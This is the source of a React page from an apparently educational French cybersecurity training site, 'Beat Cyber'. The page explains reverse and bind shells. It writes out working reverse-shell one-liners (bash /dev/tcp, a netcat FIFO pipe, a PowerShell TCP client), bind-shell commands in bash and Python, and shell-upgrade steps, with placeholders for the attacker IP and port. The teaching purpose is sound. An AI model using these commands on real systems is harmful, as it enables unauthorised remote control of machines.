import Head from "next/head";
import React from "react";
import { Login, Logout, Profile, Profile_link} from './index.tsx';
import useDownloader from "react-use-downloader";


export default function Home() {

  class Connexion extends React.Component {
    state = {
      myInputValue: ""
    }
   
    render(){
     <input
       type="text"
       value={this.state.myInputValue}
       onChange={e => this.setState({myInputValue: e.target.value})}/>
    }
  }

  const { size, elapsed, percentage, download,
    cancel, error, isInProgress } =
useDownloader();

const fileUrl = "/management_progrès.pptx";
const filename = "management_progrès.pptx";

function barre_chargement() {
  return (
  <div>
  <progress id="file" value={percentage} max="100" />
  <p>Elapsed time in seconds {elapsed}</p>
  </div>
  )
}

class NameForm extends React.Component {
  constructor(props) {
    super(props);
    this.state = {value: '', answered: false};
    this.handleChange = this.handleChange.bind(this);
    this.handleSubmit = this.handleSubmit.bind(this);
  }

  handleChange(event) {    this.setState({value: event.target.value});  }
  handleSubmit(event) {
    //alert('Le nom a été soumis : ' + this.state.value);
    if(this.state.value=="test") {
      alert("C'est la bonne réponse !")
      this.setState({answered: true});
    }
    event.preventDefault();
  }

  render() {
    return (
      <form STYLE="text-align:center" onSubmit={this.handleSubmit}>        
      <label>
          Nom :
          <input STYLE="margin-top:20%" type="text" value={this.state.value} onChange={this.handleChange} />        
          </label>
        <div STYLE="text-align:center"><input type="submit" STYLE="margin-top:3.5%" value="Envoyer" />
        {this.state.answered && <div STYLE="margin-bottom:5%; text-align:center; margin-left:23%"><a href="./profil" STYLE="color:black">Connectez vous pour commencer</a></div>}
        </div></form>
    );
  }
}
    

  
  return (
    <div>
      <Head>
        <title>Beat Cyber</title>
        <meta name="description" content="Welcome to beat-cyber" />
        <link rel="icon" href="/peter.png" />
      </Head>


      <main>
        <div className="top_page_header">
          <div className="align_right"><button className="btn btn-primary" id="login_button">{Profile()}{Login()}{Profile_link()}{Logout()}</button></div>
          <h1 className="main_title">Beat Cyber</h1>
          <div className="flip_list">
            <a href="/" className="internal_links1">Accueil</a>
            <a href="/description_projet" className="internal_links1">Le Projet</a>
            <a href="/qui_sommes_nous" className="internal_links1">Qui sommes-nous</a>
            <a href="https://www.depinfonancy.net/" className="internal_links1">Partenaires</a>
          </div>
        </div>




<div className="row row-cols-1 row-cols-md-1 g-4" id="upside_down_cards_row3">
  <h1 id="page_title">Création d'interfaces systèmes</h1>
      <div className="card-body">
        <div className="card-text" id="form_content">
            <div STYLE="margin-bottom:2%" className="larger_text">&emsp;&emsp;&emsp;Une interface système, souvent appelée « shell » même dans la documentation française, est un programme recevant les commandes écrites par l’utilisateur, et capable de les envoyer au système d’exploitation de la machine pour que celui-ci puisse les exécuter. Sur les systèmes Unix et donc notamment sur Linux, les shells ont pendant longtemps été la seule interface avec laquelle pouvait interagir l’utilisateur. De ce fait, elles sont bien plus puissantes et complètes que celles d’autres systèmes tels que Windows où l’utilisateur classique n’est pas sensé utiliser le terminal de commandes (la powershell). L’interface par défaut des systèmes d’exploitation Unix est le Bash (Bourn Again Shell).</div>
            <div STYLE="margin-bottom:2%" className="larger_text">&emsp;&emsp;&emsp;En cybersécurité, l’objectif pour l’attaquant est souvent de prendre le contrôle d’une machine, ce qui se met en pratique au travers de l’accès à une interface système depuis laquelle il peut exécuter des commandes sur la machine cible. Il produira ensuite une shell sur sa propre machine pouvant contrôler l’hôte distant.</div>
            <div STYLE="margin-bottom:2%" className="larger_text">&emsp;&emsp;&emsp;Il n’existe presque jamais d’interfaces systèmes auxquelles l’attaquant peut avoir accès directement sans crédits d’authentification. Ce dernier doit donc considérer deux options : compromettre un service d’authentification tel que SSH pour obtenir des privilèges sur la machine, ou créer de lui-même l’interface système dont il a besoin.</div>
            <div STYLE="margin-bottom:2%" className="larger_text">&emsp;&emsp;&emsp;Si l’attaquant fait ce choix, il commencera par mettre en place une « reverse shell ». Il s’agit d’une interface système sur la machine cible, communiquant avec la nôtre à partir d’une connexion déployée par payload (lorsque l’on a identifié une faille de sécurité permettant l’exécution de code chez la cible). Depuis cette reverse shell la machine renvoie toutes les informations vers un port de notre machine locale sur lequel on exécute un système d’écoute tel que netcat.</div>
            <div STYLE="margin-bottom:5%; margin-top:5%;text-align:center" className="larger_text">
            <img src="/reverse.jpg" STYLE=" border-style:solid; border-width:4px;border-radius: 10px;" className="img-fluid" alt="Responsive image"></img>
            </div>
            <div STYLE="margin-bottom:2%" className="larger_text">&emsp;&emsp;&emsp;Pour mettre en place une reverse shell, l’attaquant doit depuis son terminal ouvrir une session d’écoute avec netcat. La commande la plus utilisée augmente également la verbosité pour obtenir les détails de la connexion établie et désactive la résolution en IP des noms de domaine pour améliorer la vitesse de communication lorsque la connexion sera établie. La commande complète est donc ( nc -lvnp [local listening port] ).</div>
            <div STYLE="margin-bottom:2%" className="larger_text">&emsp;&emsp;&emsp;Il faut ensuite mettre en place la connexion inversée (l’hôte sollicite la machine locale) en parvenant à exécuter une ligne de commande depuis la cible. Pour cela on peut utiliser des exploits préconçus tels que ceux proposés par Metasploit, ou encore faire parvenir un fichier au serveur après avoir déduit que son contenu sera exécuté par un compilateur, un interpréteur ou une interface système. Voici quelques exemples de commandes à intégrer dans ces programmes pour démarrer une connexion inversée :
            <ul>
            <li STYLE="margin-bottom:2%">bash -c 'bash -i &#62;& /dev/tcp/[My IP]/[Port d’écoute] 0&#62;&1'	en bash</li>
            <li STYLE="margin-bottom:2%">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 20&#62;&1|nc [My IP] [Port d’écoute] 0&#62;/tmp/f	également en bash</li>
            <li STYLE="margin-bottom:2%">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[My IP]",[Port d’écoute] );$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding ).GetString($bytes,0, $i);$sendback = ( iex $data 2&#62;&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "&#62; ";$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2 );$stream.Write($sendbyte,0,$sendbyte.Length );$stream.Flushclient.Close()	en Powershell</li>
            </ul></div>
            <div STYLE="margin-bottom:2%" className="larger_text">&emsp;&emsp;&emsp;L’inconvénient majeur des Reverse Shell, c’est leur fragilité. Si la connexion est ralentie ou arrêtée, quelle qu’en soit la cause la connexion inverse sera rompue et on devra donc recommencer l’exploit et le payload sur la cible avant de pouvoir continuer nos opérations.</div>
            <div STYLE="margin-bottom:5%; margin-top:5%;text-align:center" className="larger_text">
            <img src="/reverse2.png" STYLE=" border-style:solid; border-width:4px;border-radius: 10px;" className="img-fluid" alt="Responsive image"></img>
            </div>
            <div STYLE="margin-bottom:2%" className="larger_text">&emsp;&emsp;&emsp;Un autre type de Shell que peut mettre en place l’attaquant est une « Bind Shell » : par un raisonnement inverse à celui d’une reverse shell, c’est nous qui nous connectons à un port de la machine distante, pur ensuite exploiter l’interface système de l’hôte. On doit donc cette fois mettre en place un système d’écoute chez ce dernier. Voici quelques exemples de commandes pour initier une Bind Shell :
            <ul>
              <li STYLE="margin-bottom:2%">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 20&#62;&1|nc -lvp [Target Port] 0&#62;/tmp/f	en Bash</li>
            <li STYLE="margin-bottom:2%">python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET, s.SOCK_STREAM);s1.setsockopt( s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind( ("0.0.0.0",[Target Port]));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode( );p=sp.Popen(d,shell=True, stdout=sp.PIPE,stderr=sp.PIPE, stdin=sp.PIPE);c.sendall( p.stdout.read()+p.stderr.read())""")'		en Python</li>
            
              </ul></div>
            <div STYLE="margin-bottom:2%" className="larger_text">&emsp;&emsp;&emsp;On établit ensuite une session avec netcat en utilisant la commande ( netcat [Host IP] [Host Port] ) pour envoyer à notre Shell distante toutes les commandes que l’on souhaite y faire s’exécuter.</div>
            <div STYLE="margin-bottom:2%" className="larger_text">&emsp;&emsp;&emsp;Une fois que l’on dispose d’une interface de commande chez l’hôte on doit améliorer cette shell pour qu’elle dispose de toutes les fonctionnalités qu’on attend d’une interface locale. Pour cela, on utilise la commande [ python -c 'import pty; pty.spawn("/bin/bash")' ] en l’adaptant à python3 si nécessaire, puis on place la shell à l’arrière plan avec CRTL + Z pour effectuer sur notre propre terminal la commande [ stty raw -echo ] qui réinitialise les réglages d’affichage des terminaux Bash. On reprend la Bind Shell au premier plan avec la commande [ fg ] puis en appuyant sur la touche d’entrée. Dès lors les options usuelles sont disponibles, notamment la commande sudo pour obtenir si possible des permissions, ou les raccourcis clavier tels que CRTL + C pour interrompre un programme (et non plus interrompre la connexion).</div>
            
            <div STYLE="margin-bottom:5%; text-align:right" className="larger_text">&emsp;&emsp;&emsp;<a href="/Room" STYLE="color:black">Rejoignez la page suivante pour continuer</a></div>
      </div>
      </div>
</div>

  <script
        src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossOrigin="anonymous"
        async
      ></script>
      <footer><div className="top_page_footer">
          <div className="flip_list2">
            <a href="#top" className="internal_links1">Retour haut de page</a>
            <a href="https://www.hackthebox.com/" className="internal_links1">Plateforme similaire</a>
            <a href="https://www.depinfonancy.net/" className="internal_links1">Partenaires</a>
          </div>
        </div></footer>
      </main>


      
    </div>
    
    
  );
}

